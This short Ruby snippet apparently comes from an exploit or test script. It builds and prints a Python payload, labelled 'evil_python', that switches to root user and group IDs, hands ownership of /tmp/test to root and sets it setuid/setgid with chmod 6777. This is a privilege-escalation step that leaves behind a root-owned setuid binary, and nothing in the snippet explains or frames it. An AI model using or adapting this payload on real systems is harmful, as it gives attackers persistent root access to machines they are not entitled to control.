
evil_python =<<-EOF
import os
os.setuid(0)
os.setgid(0)
os.system("chown root /tmp/test")
os.system("chmod 6777 /tmp/test")
EOF

print(evil_python)
